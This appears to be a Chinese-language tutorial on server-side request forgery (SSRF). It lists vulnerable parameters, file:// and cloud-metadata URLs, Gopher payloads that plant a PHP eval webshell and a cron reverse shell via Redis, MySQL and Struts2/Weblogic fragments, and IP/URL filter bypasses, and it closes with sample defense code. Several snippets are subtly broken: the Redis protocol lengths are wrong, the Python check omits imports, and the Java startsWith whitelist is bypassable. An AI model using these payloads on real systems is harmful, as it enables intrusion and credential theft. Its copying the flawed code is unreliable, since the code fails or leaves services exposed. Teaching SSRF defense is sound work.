---
title: "SSRF服务器端请求伪造详解"
description: "深入讲解SSRF漏洞原理、Gopher协议利用、内网探测与绕过技巧"
pubDate: 2026-05-18
heroImage: ""
tags: ["漏洞原理", "SSRF", "Web安全"]
category: "kb"
severity: "high"
cve: ""
vul_type: "SSRF"
---

# SSRF服务器端请求伪造详解

## 漏洞原理

SSRF（Server-Side Request Forgery）服务器端请求伪造，**服务器替用户发起请求，攻击者可利用此功能探测内网、访问本不该访问的资源**。

**核心：** 服务器具有请求能力，攻击者通过控制请求参数实现攻击

```
正常流程：
用户 → 发起正常请求 → 服务器 → 返回结果

SSRF攻击：
攻击者 → 构造恶意URL → 服务器 → 访问内网/云元数据/其他服务
```

---

## SSRF常见触发点

| 功能 | 参数示例 |
|------|---------|
| 图片抓取 | `url=`, `src=`, `img=`, `image=` |
| 文件预览 | `file=`, `path=`, `doc=` |
| URL跳转 | `next=`, `url=`, `redirect=` |
| 代理功能 | `proxy=`, `realip=` |
| API调用 | `api=`, `feed=` |

---

## SSRF利用方式

### 1. 探测内网存活主机

```
# 使用dict协议探测端口
url=dict://192.168.1.1:22
url=dict://192.168.1.1:3306

# 使用file协议读取文件
url=file:///etc/passwd
url=file:///var/www/html/config.php
```

### 2. 读取云元数据（AWS/GCP/阿里云）

```
# AWS EC2 元数据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/

# 腾讯云
http://172.16.0.23/latest/meta-data/
```

### 3. 利用Gopher协议攻击Redis

```
# Gopher格式：gopher://host:port/_ + 原始协议数据

# 写WebShell到本地
gopher://127.0.0.1:6379/_ KEYS *\r\n
*3\r\n$3\r\nSET\r\n$5\r\nshell\r\n$20\r\n<?php eval($_POST[x]);?>\r\n

# 利用Redis写定时任务反弹Shell
*1\r\n$8\r\nFLUSHDB\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndir\r\n$5\r\n/var/spool/cron\r\n
*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n
*5\r\n$4\r\nSAVE\r\n
*1\r\n$8\r\nFLUSHDB\r\n
```

### 4. 利用Gopher攻击MySQL

```
# MySQL无密码root写文件
gopher://127.0.0.1:3306/_ \x00\x00\x01\x85\xa6\xff\x01...

# MySQL读取数据
gopher://127.0.0.1:3306/_ SHOW VARIABLES;
```

### 5. 攻击内网Web应用

```
# Struts2 S2-045
url=http://192.168.1.100:8080/
Content-Type: %{(#_='multipart/form-data')...

# Weblogic CVE-2017-10271
url=http://192.168.1.100:7001/
SOAPAction: /
```

---

## SSRF绕过技巧

### IP地址绕过

```python
# 进制转换
192.168.1.1
→ 十进制: 3232235777
→ 十六进制: 0xC0A80101
→ 十六进制带0: 0xC0.0xA8.0x01.0x01
→ IPv6: [::192.168.1.1]

# URL编码绕过
localhost → 127.0.0.1
0 → 127.0.0.1
127.1 → 127.0.0.1
```

### URL解析绕过

```
# @符号绕过
http://example.com@127.0.0.1
# 实际解析到127.0.0.1

# 井号绕过
http://127.0.0.1#@example.com

# DNS重绑定
先解析到公网IP，再解析到内网IP

# 短域名
xip.io / nip.io
http://127.0.0.1.xip.io/ → 解析到127.0.0.1
```

---

## 防御方案

```python
# Python 防御
import ipaddress
ALLOWED_SCHEMES = {'http', 'https'}
BLOCKED_HOSTS = {'127.0.0.1', 'localhost', '169.254.169.254'}

def validate_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    try:
        ip = gethostbyname(parsed.hostname)
        if ipaddress.ip_address(ip).is_private:
            return False
    except:
        return False
    return True

# Java 防御
String whitelist = "https://api.example.com";
if (!url.startsWith(whitelist)) {
    throw new SecurityException("URL not allowed");
}
```
